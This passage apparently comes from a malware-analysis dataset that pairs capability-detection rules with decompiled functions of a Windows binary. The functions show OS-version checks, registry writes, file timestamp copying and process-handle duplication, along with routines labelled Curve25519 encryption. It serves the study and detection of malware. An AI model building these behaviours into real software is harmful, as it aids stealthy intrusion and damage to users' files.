(uVar5 == 0) {\n            if ((bVar10) && (!bVar10)) {\n                puVar8 = &fcn.00403800::arg_14h;\n                cVar1 = '\\x1e';\n                do {\n                    unaff_EBP = unaff_EBP + -1;\n                    puVar8 = puVar8 + -1;\n                    *puVar8 = *unaff_EBP;\n                    cVar1 = cVar1 + -1;\n                } while ('\\0' < cVar1);\n                uVar5 = in(0x78);\n                return uVar5;\n            }\n            uVar5 = unaff_EBP[8];\n            *(uVar5 + 0x120) = *(uVar5 + 0x120) | 0x80;\n        }\n    }\n    return uVar5;\n}\n",
        "token_count": 1978
    },
    "00404a00": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nint64_t fcn.00404a00(void)\n\n{\n    uint32_t extraout_EDX;\n    uint lpVersionInformation;\n    int32_t var_90h;\n    int32_t var_8ch;\n    \n    (*_sym.imp.KERNEL32.dll_GetVersionExA)();\n    if (var_90h == 5) {\n        return CONCAT44(extraout_EDX, 1);\n    }\n    if ((var_90h == 6) && (var_8ch == 0)) {\n        return CONCAT44(extraout_EDX, 1);\n    }\n    return extraout_EDX << 0x20;\n}\n",
        "token_count": 137
    },
    "00404b40": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404b40(char *arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    char *pcVar6;\n    uchar var_264h;\n    uint var_263h;\n    char var_160h;\n    uint var_15fh;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    char *var_20h;\n    char *var_1ch;\n    uint *var_18h;\n    uint *var_14h;\n    uint *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar2 = _sym.imp.MSVCRT.dll_sprintf;\n    var_264h = 0;\n    puVar5 = &var_263h;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_160h = '\\0';\n    puVar5 = &var_15fh;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_ch = 1;\n    var_4h = 0;\n    var_8h = 1;\n    (*_sym.imp.MSVCRT.dll_sprintf)(&var_160h, 0x41140c, arg_8h);\n    (*pcVar2)(&var_264h, 0x411424, arg_8h);\n    pcVar2 = _sym.imp.SHLWAPI.dll_SHSetValueA;\n    var_20h = &var_160h;\n    var_18h = &var_ch;\n    var_14h = &var_4h;\n    var_10h = &var_8h;\n    uVar4 = 0xffffffff;\n    pcVar6 = &var_160h;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar1 != '\\0');\n    var_48h = ~uVar4 - 1;\n    uVar4 = 0xffffffff;\n    pcVar6 = arg_8h;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar1 != '\\0');\n    var_34h = 0x41144c;\n    var_30h = 0x411458;\n    var_2ch = 0x411464;\n    var_28h = 0x411474;\n    var_24h = 0x41147c;\n    var_5ch = 2;\n    var_58h = 1;\n    var_54h = 4;\n    var_50h = 4;\n    var_4ch = 4;\n    var_1ch = arg_8h;\n    var_44h = ~uVar4 - 1;\n    var_40h = 4;\n    var_3ch = 4;\n    var_38h = 4;\n    if ((arg_ch != 0) < 5) {\n        uVar4 = (arg_ch != 0) * 4;\n        do {\n            iVar3 = (*pcVar2)(0x80000002, &var_264h, *(&var_34h + uVar4), *(&var_5ch + uVar4), *(&var_20h + uVar4), \n                              *(&var_48h + uVar4));\n            if (iVar3 != 0) {\n                return 0;\n            }\n            uVar4 = uVar4 + 4;\n        } while (uVar4 < 0x14);\n    }\n    return 1;\n}\n",
        "token_count": 1088
    },
    "004025f0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040260b) overlaps instruction at (ram,0x00402607)\n// \n// WARNING: Removing unreachable block (ram,0x00402769)\n// WARNING: Could not reconcile some variable overlaps\n\nbool fcn.004025f0(void)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    char *pcVar4;\n    int32_t extraout_ECX;\n    uint unaff_EBX;\n    uchar **unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint *puVar5;\n    uint8_t in_AF;\n    bool bVar6;\n    char cVar7;\n    char cVar8;\n    uint var_80h;\n    uint var_60h;\n    uint var_40h;\n    uchar var_20h;\n    uint var_1fh;\n    uchar *puStack4;\n    \n    while( true ) {\n        puStack4 = unaff_EBP;\n        iVar2 = fcn.00404a00(unaff_EDI, unaff_ESI, unaff_EBX);\n        if (iVar2 == 0) {\n            return false;\n        }\n        fcn.00404aa0();\n        iVar2 = fcn.00402860(0xf4);\n        cVar8 = SBORROW4(iVar2, -1);\n        cVar7 = iVar2 + 1 < 0;\n        bVar6 = iVar2 == -1;\n        if (!bVar6) {\n            return false;\n        }\n        uVar3 = fcn.00402f50();\n        *0x41e84c = 1;\n        if ((bVar6 || cVar8 != cVar7) || (!bVar6 && cVar8 == cVar7)) break;\n        in_AF = 9 < (uVar3 & 0xf) | in_AF;\n        uVar1 = uVar3 + in_AF * '\\x06';\n        pcVar4 = uVar3 & 0xffff0000 | CONCAT11((uVar3 >> 8) + in_AF, uVar1) & 0xff0f;\n        if (extraout_ECX != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        *pcVar4 = *pcVar4 + (uVar1 & 0xf);\n        unaff_EBP = &puStack4;\n    }\n    iVar2 = fcn.00402820();\n    if (iVar2 != 0) {\n        return false;\n    }\n    var_20h = 0;\n    var_80h._0_1_ = 0;\n    puVar5 = &var_1fh;\n    for (iVar2 = 7; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_60h._0_1_ = 0;\n    puVar5 = &var_80h + 1;\n    for (iVar2 = 7; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_40h._0_1_ = 0;\n    puVar5 = &var_60h + 1;\n    for (iVar2 = 7; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    puVar5 = &var_40h + 1;\n    for (iVar2 = 7; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    iVar2 = fcn.00402480(&var_80h, &var_60h, &var_20h, &var_40h);\n    if (iVar2 != 0) {\n        iVar2 = fcn.00403d50(&var_20h);\n        if (iVar2 != 0) {\n            if ((-1 < iVar2) && (-1 >= iVar2)) {\n                out(0xc4, iVar2);\n                *(puVar5 + 3) = iVar2;\n            }\n            iVar2 = fcn.00401500(&var_80h, &var_60h, &var_20h, &var_40h);\n            return iVar2 != 0;\n        }\n        return false;\n    }\n    return false;\n}\n",
        "token_count": 1124
    },
    "00402820": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.00402820(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.004049a0(0x411390);\n    if (iVar1 != -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 74
    },
    "00402860": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00402920) overlaps instruction at (ram,0x0040291e)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint fcn.00402860(uint param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    bool bVar4;\n    int32_t aiStackY421 [17];\n    int32_t iStack336;\n    uint uStack308;\n    uint auStack304 [8];\n    uchar auStack272 [260];\n    uint uStack12;\n    int32_t iStack8;\n    \n    uStack12 = 0xffffffff;\n    iVar1 = (**0x41e850)();\n    if (iVar1 == -1) {\n        return 0xffffffff;\n    }\n    uStack308 = 0x128;\n    puVar3 = auStack304;\n    iStack8 = iVar1;\n    for (iVar2 = 0x49; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    iStack336 = iVar1;\n    iVar2 = (**0x41e854)();\n    do {\n        if (iVar2 == 0) {\ncode_r0x0040292c:\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n            return uStack12;\n        }\n        iVar1 = (*_sym.imp.MSVCRT.dll__stricmp)(auStack272, param_1);\n        bVar4 = iVar1 == 0;\n        if (bVar4) {\n            if ((!bVar4) && (bVar4)) {\n                *(puVar3 + -0x75) = *(puVar3 + -0x75) - &iStack336;\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            uStack12 = auStack304[1];\n            iVar1 = iStack8;\n            goto code_r0x0040292c;\n        }\n        iVar2 = (**0x41e858)(iStack8, &uStack308);\n        iVar1 = iStack8;\n    } while( true );\n}\n",
        "token_count": 504
    },
    "00403640": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00403640(uint arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    char *pcVar6;\n    char *pcVar7;\n    char *pcVar8;\n    uint *puVar9;\n    char lpBuffer;\n    uint var_22fh;\n    uchar var_12ch;\n    uint var_12bh;\n    uint var_28h;\n    uint lpCreationTime;\n    uint var_1ch;\n    uint var_14h;\n    int32_t var_4h;\n    \n    var_4h = arg_ch;\n    lpBuffer = '\\0';\n    puVar5 = &var_22fh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_12ch = '\\0';\n    puVar5 = &var_12bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    uVar3 = 0xffffffff;\n    pcVar7 = &lpBuffer;\n    do {\n        pcVar6 = pcVar7;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar6 = pcVar7 + 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar6;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    puVar5 = pcVar6 + -uVar3;\n    puVar9 = &var_12ch;\n    for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    uVar3 = 0xffffffff;\n    pcVar7 = 0x4113c8;\n    do {\n        pcVar6 = pcVar7;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar6 = pcVar7 + 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar6;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    pcVar7 = &var_12ch;\n    do {\n        pcVar8 = pcVar7;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar8 = pcVar7 + 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar8;\n    } while (cVar1 != '\\0');\n    puVar5 = pcVar6 + -uVar3;\n    puVar9 = pcVar8 + -1;\n    for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    (*_sym.imp.KERNEL32.dll_GetFileAttributesExA)(&var_12ch, 0, &var_28h);\n    iVar2 = var_4h;\n    if ((arg_ch == -1) && (iVar2 = fcn.004049a0(arg_8h),  iVar2 == -1)) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_SetFileTime)(iVar2, &lpCreationTime, &var_1ch, &var_14h);\n    if (arg_ch == -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n    }\n    return 1;\n}\n",
        "token_count": 1156
    },
    "00403ae0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nulong __cdecl fcn.00403ae0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll__access)(arg_8h, 0);\n    if (iVar1 == -1) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 73
    },
    "00404470": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nbool fcn.00404470(void)\n\n{\n    int32_t iVar1;\n    uint var_10ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0x104;\n    iVar1 = fcn.00401870(0x80000002, 0x411670, 0x4116b0, &var_8h, &var_10ch, &var_4h);\n    if (iVar1 == 0) {\n        return false;\n    }\n    iVar1 = (*_sym.imp.MSVCRT.dll__access)(&var_10ch, 0);\n    return iVar1 != -1;\n}\n",
        "token_count": 150
    },
    "00404cf0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404cf0(uint arg_8h)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    int32_t *piVar6;\n    bool in_PF;\n    int32_t iStack16;\n    \n    puVar5 = &stack0xfffffffc;\n    if ((!in_PF) && (in_PF)) {\n        piVar6 = &iStack16;\n        cVar1 = '\\x1e';\n        do {\n            puVar5 = puVar5 + -1;\n            piVar6 = piVar6 + -1;\n            *piVar6 = *puVar5;\n            cVar1 = cVar1 + -1;\n        } while ('\\0' < cVar1);\n        uVar2 = in(0x78);\n        return uVar2;\n    }\n    iStack16 = 0x4113fc;\n    iStack16 = fcn.00402860();\n    if (iStack16 == -1) {\n        return 0;\n    }\n    iVar3 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x40, 0);\n    if (iVar3 == 0) {\n        return 0;\n    }\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(arg_8h, iVar3, 0, 0, 0, 2);\n    iVar4 = (*_sym.imp.KERNEL32.dll_DuplicateHandle)(uVar2);\n    if (iVar4 == 0) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar3);\n    return 1;\n}\n",
        "token_count": 373
    },
    "00404db0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404e69) overlaps instruction at (ram,0x00404e67)\n// \n// WARNING: Unable to track spacebase fully for stack\n\nuint __cdecl fcn.00404db0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    code *pcVar1;\n    uint in_EAX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    char in_DL;\n    uint extraout_EDX;\n    int32_t unaff_EBX;\n    uint32_t uVar5;\n    uint32_t *puVar6;\n    uint unaff_EDI;\n    bool bVar7;\n    ulong uVar8;\n    int32_t iStack64;\n    uint uStack60;\n    uint uStack56;\n    uint *puStack52;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint var_4h;\n    \n    bVar7 = SBORROW1(in_DL + '\\x15', in_EAX >> 8);\n    uStack20 = 0x404dc5;\n    *0x41e848 = fcn.00404470();\n    if ((!bVar7) && (bVar7)) {\n        LOCK();\n    }\n    uStack20 = 0;\n    uStack24 = 0x80;\n    uStack28 = 2;\n    uStack32 = 0;\n    uStack36 = 1;\n    uStack40 = 0x40000000;\n    uStack44 = arg_8h;\n    uStack48 = 0x404e09;\n    iVar2 = (*_sym.imp.KERNEL32.dll_CreateFileA)();\n    if (iVar2 == -1) {\n        return 0;\n    }\n    puStack52 = &fcn.00404db0::var_4h;\n    uStack48 = 0;\n    uStack56 = arg_10h;\n    uStack60 = arg_ch;\n    iStack64 = iVar2;\n    uVar3 = (*_sym.imp.KERNEL32.dll_WriteFile)();\n    if (uVar3 == 0) {\n        return 0;\n    }\n    if ((uVar3 < 0) || (uVar3 >= 0)) {\n        uVar3 = *0x41e848;\n    }\n    uVar5 = &stack0xffffffc0 ^ *(unaff_EBX + -0x5f);\n    bVar7 = iVar2 == 1;\n    puVar6 = uVar5 - 4;\n    *(uVar5 - 4) = 0x404e70;\n    func_0xc0c54eb1();\n    uVar4 = extraout_EDX;\n    if (!bVar7) {\n        puVar6[-1] = uVar3;\n        puVar6[-2] = 0x404e78;\n        uVar8 = fcn.00404cf0(puVar6[-1]);\n        uVar4 = uVar8 >> 0x20;\n        *0x41e848 = uVar8 == 0;\n    }\n    puVar6[-1] = uVar4;\n    puVar6[-2] = unaff_EDI;\n    puVar6[-1] = uVar3;\n    puVar6[-2] = 0;\n    puVar6[-3] = 0x404e99;\n    uVar4 = fcn.00403640(puVar6[-2], puVar6[-1]);\n    if ((puVar6 + -2 < 0xfffffff8 && puVar6 != NULL) &&\n       (puVar6[-1] = uVar4,  puVar6 + -2 >= 0xfffffff8 || puVar6 == NULL)) {\n        uVar3 = *puVar6;\n        puVar6 = puVar6 + 3;\n    }\n    if (*0x41e848 == 0) {\n        *(puVar6 + -4) = uVar3;\n        pcVar1 = _sym.imp.KERNEL32.dll_CloseHandle;\n        *(puVar6 + -8) = 0x404ec3;\n        (*pcVar1)();\n    }\n    return 1;\n}\n",
        "token_count": 953
    },
    "00401950": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nuint32_t fcn.00401950(void)\n\n{\n    char cVar1;\n    uchar *puVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uint *puVar6;\n    bool bVar7;\n    uchar *puStack312;\n    uint uStack308;\n    uint uStack304;\n    uint uStack300;\n    uint *puStack296;\n    uchar pvData;\n    uint var_10bh;\n    uint pdwType;\n    uint pcbData;\n    \n    puVar5 = &stack0xfffffffc;\n    pvData = 0;\n    pcbData = 0x104;\n    puVar6 = &fcn.00401950::var_10bh;\n    for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    *puVar6 = 0;\n    *(puVar6 + 2) = 0;\n    puStack296 = &fcn.00401950::pdwType;\n    uStack300 = 0x411808;\n    uStack304 = 0x4117e0;\n    uStack308 = 0x80000002;\n    puStack312 = 0x4019b1;\n    iVar4 = (*_sym.imp.SHLWAPI.dll_SHGetValueA)();\n    if (iVar4 != 0) {\n        return 0;\n    }\n    puStack312 = 0x2e;\n    puVar2 = (*_sym.imp.MSVCRT.dll_strchr)(&stack0xfffffef0);\n    bVar7 = (POPCOUNT(puVar2 & 0xff) & 1U) != 0;\n    if (puVar2 == NULL) {\n        return 0;\n    }\n    if ((bVar7) && (!bVar7)) {\n        puVar6 = &stack0xfffffec8;\n        cVar1 = '\\x1e';\n        do {\n            puVar5 = puVar5 + -1;\n            puVar6 = puVar6 + -1;\n            *puVar6 = *puVar5;\n            cVar1 = cVar1 + -1;\n        } while ('\\0' < cVar1);\n        uVar3 = in(0x78);\n        return uVar3;\n    }\n    puStack312 = &stack0xfffffef0;\n    *puVar2 = 0;\n    iVar4 = (*_sym.imp.MSVCRT.dll_atoi)();\n    if (iVar4 == 6) {\n        return 1;\n    }\n    return iVar4 == 7;\n}\n",
        "token_count": 590
    },
    "00402f50": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004031da) overlaps instruction at (ram,0x004031d8)\n// \n\nvoid fcn.00402f50(void)\n\n{\n    char *pcVar1;\n    uint16_t uVar2;\n    uint16_t extraout_CX;\n    ushort extraout_CX_00;\n    int32_t extraout_ECX;\n    int32_t extraout_ECX_00;\n    uint16_t extraout_DX;\n    uint32_t uVar3;\n    uint32_t extraout_EDX;\n    uint16_t unaff_BX;\n    uint32_t unaff_ESI;\n    int32_t iVar4;\n    ushort in_SS;\n    bool bVar5;\n    bool bVar6;\n    char cVar7;\n    char cVar8;\n    uchar uVar9;\n    ulong uVar10;\n    uint arg_10h;\n    ushort uVar11;\n    uchar in_stack_ffffffd6;\n    uchar in_stack_ffffffd7;\n    uchar uVar12;\n    uchar in_stack_ffffffd8;\n    ushort in_stack_ffffffd9;\n    uchar in_stack_ffffffdb;\n    ushort in_stack_ffffffdc;\n    uchar in_stack_ffffffde;\n    uchar uVar13;\n    uchar in_stack_ffffffdf;\n    uint8_t uVar14;\n    unkbyte3 Var15;\n    ushort uVar16;\n    uchar uVar17;\n    \n    fcn.00404910(0x41e814, 10, 0x411390, 0x11);\n    fcn.00404910(0x41e814, 10, 0x4115ac, 0xf);\n    bVar5 = (POPCOUNT(((unaff_BX ^ (unaff_ESI >> 8 & 0xff) << 8) >> 8) - 1U & 0xd) & 1U) == 0;\n    uVar10 = fcn.00404910(0x41e814, 10, 0x4115bc, 0x1a);\n    if ((bVar5) || (!bVar5)) {\n        in_stack_ffffffdc = 0x1610;\n        in_stack_ffffffde = 0x41;\n        in_stack_ffffffdf = 0;\n        in_stack_ffffffd8 = 10;\n        in_stack_ffffffd9 = 0;\n        in_stack_ffffffdb = 0;\n    }\n    iVar4 = 0x34a96cf4;\n    pcVar1 = uVar10 + 10;\n    *pcVar1 = *pcVar1 + ((extraout_CX & 0xff | (extraout_CX >> 8 | *((uVar10 >> 0x20) + 0x11)) << 8) + 1 >> 8);\n    fcn.00404910(0x41e814, CONCAT13(in_stack_ffffffd7, CONCAT12(in_stack_ffffffd6, in_SS)), \n                 CONCAT13(in_stack_ffffffdb, CONCAT21(in_stack_ffffffd9, in_stack_ffffffd8)), \n                 CONCAT13(in_stack_ffffffdf, CONCAT12(in_stack_ffffffde, in_stack_ffffffdc)));\n    fcn.00404910(0x41e814, 10, 0x41161c, 0xb);\n    fcn.00404910(0x41e814, 10, 0x411628, 8);\n    bVar5 = SBORROW4(extraout_ECX, 0x5354);\n    fcn.00404910(0x41e814, 10, 0x411630, 9);\n    if ((!bVar5) && (bVar5)) {\n        LOCK();\n        iVar4 = 0x138b2633;\n    }\n    fcn.00404910(0x41e814, 10, 0x41163c, 9);\n    fcn.00404910(0x41e814, 10, 0x411648, 9);\n    arg_10h = 0x41e814;\n    fcn.00404910(0x41e814, 10, 0x411654, 0xc);\n    fcn.00404910(0x41e814, 10, 0x411660, 3);\n    fcn.00404910(0x41e814, 10, 0x411664, 10);\n    uVar2 = fcn.00404910(0x41e814, 10, 0x411670, 0x40);\n    uVar2 = (extraout_DX & 0xff00 | (extraout_DX & 0x4e | 0x38) & uVar2) & uVar2 ^ 0x3c00;\n    uVar3 = (uVar2 & 0xff | (uVar2 >> 8) + (unaff_BX >> 8) << 8) | 0x604;\n    bVar5 = CARRY1(uVar3 >> 8, uVar3);\n    uVar16 = 10;\n    uVar12 = 0;\n    uVar17 = 0;\n    uVar9 = 0;\n    Var15 = 0x41e814;\n    fcn.00404910(0x41e814, 10, 0x4116b0, 0xc);\n    uVar3 = extraout_EDX;\n    if (bVar5) {\ncode_r0x004031b2:\n        uVar13 = 0;\n        uVar14 = 0;\n    }\n    else {\n        uVar13 = extraout_EDX >> 0x10;\n        uVar14 = extraout_EDX >> 0x18;\n        uVar3 = extraout_EDX & 0xffffff | uVar14 << 0x18;\n        if (!bVar5) goto code_r0x004031b2;\n    }\n    *(iVar4 + 0x43d1773a) = *(iVar4 + 0x43d1773a) ^ 0x6a27e95e;\n    pcVar1 = uVar3 + 10;\n    cVar7 = extraout_ECX_00 + 1 >> 8;\n    cVar8 = SCARRY1(*pcVar1, cVar7);\n    *pcVar1 = *pcVar1 + cVar7;\n    cVar7 = *pcVar1 < '\\0';\n    uVar11 = 0x31c5;\n    fcn.00404910(0x41e814, CONCAT13(uVar14, CONCAT12(uVar13, in_SS)), CONCAT13(uVar9, Var15), \n                 CONCAT13(uVar17, CONCAT12(uVar12, uVar16)));\n    if (cVar8 == cVar7) {\n        uVar9 = extraout_CX_00;\n        uVar12 = extraout_CX_00 >> 8;\n        if (cVar8 != cVar7) goto code_r0x004031e1;\n    }\n    uVar11 = 4;\n    uVar9 = 0;\n    uVar12 = 0;\n    arg_10h = 0x4116c8;\ncode_r0x004031e1:\n    uVar3 = fcn.00404910(0x41e814, 10, arg_10h, CONCAT13(uVar12, CONCAT12(uVar9, uVar11)));\n    bVar5 = uVar3 < 0x6e32;\n    uVar9 = SBORROW4(uVar3, 0x6e32);\n    bVar6 = uVar3 == 0x6e32;\n    fcn.00404910(0x41e814, 10, 0x4116cc, 4);\n    if ((!bVar5 && !bVar6) && (bVar5 || bVar6)) {\n        uVar9 = SBORROW4(&stack0xffffffec, 1);\n    }\n    fcn.00404910(0x41e814, 10, 0x4116d0, 0xc);\n    if ((!uVar9) && (uVar9)) {\n        LOCK();\n    }\n    fcn.00404910(0x41e814, 10, 0x4116dc, 4);\n    fcn.00404910(0x41e814, 10, 0x4116e0, 9);\n    fcn.00404910(0x41e814, 10, 0x4116ec, 0x16);\n    fcn.00404910(0x41e814, 10, 0x411704, 7);\n    return;\n}\n",
        "token_count": 1926
    },
    "00404110": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36",
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040417f) overlaps instruction at (ram,0x0040417d)\n// \n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.00404110(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, uint8_t *arg_14h, int32_t arg_18h)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    uint8_t *puVar3;\n    uint8_t *puVar4;\n    uint8_t *puVar5;\n    int32_t iVar6;\n    uint8_t *unaff_EBX;\n    uint8_t *unaff_EDI;\n    bool bVar7;\n    uint8_t in_AF;\n    bool bVar8;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    ulong uVar9;\n    uint var_10h;\n    int32_t var_ch;\n    uint8_t *var_8h;\n    uint8_t var_2h;\n    uint var_1h;\n    \n    var_8h = NULL;\n    bVar7 = false;\n    if (0 < arg_14h) {\n        var_ch = 1;\n        puVar4 = arg_14h;\n        puVar5 = arg_14h * 2;\n        puVar3 = arg_14h;\n        do {\n            bVar8 = puVar3 < 0;\n            puVar3 = var_8h;\n            iVar6 = arg_10h;\n            if ((!bVar7) && (bVar7)) {\n                uVar2 = puVar4;\n                cVar1 = uVar2 - *unaff_EDI;\n                uVar9 = func_0x1018a0c2((in_NT & 1) * 0x4000 | SBORROW1(uVar2, *unaff_EDI) * 0x800 | (in_IF & 1) * 0x200\n                                        | (in_TF & 1) * 0x100 | (cVar1 < '\\0') * 0x80 | (cVar1 == '\\0') * 0x40 |\n                                        (in_AF & 1) * 0x10 | ((POPCOUNT(cVar1) & 1U) == 0) * 4 | uVar2 < *unaff_EDI |\n                                        (in_ID & 1) * 0x200000 | (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 